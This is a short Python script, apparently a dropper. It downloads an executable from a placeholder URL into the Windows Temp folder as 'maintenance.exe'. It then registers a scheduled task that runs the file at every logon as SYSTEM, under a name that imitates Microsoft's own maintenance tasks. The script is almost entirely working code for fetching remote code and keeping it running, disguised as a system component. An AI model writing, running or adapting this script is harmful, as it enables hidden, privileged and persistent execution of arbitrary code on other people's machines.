import os, logging
from urllib import request

logging.basicConfig(level=logging.INFO, filename="install.log", format="%(asctime)s - %(levelname)s - %(message)s")


request.urlretrieve("url" , 'c:/Windows/Temp/maintenance.exe')

try:
    os.popen(rf'schtasks /create /sc ONLOGON /ru System /tr c:\Windows\Temp\maintenance.exe /tn Microsoft\Windows\Maintenance\maintenance')
    logging.info('maintenance task create with successful')
except:
    logging.error('maintenance task was not create')
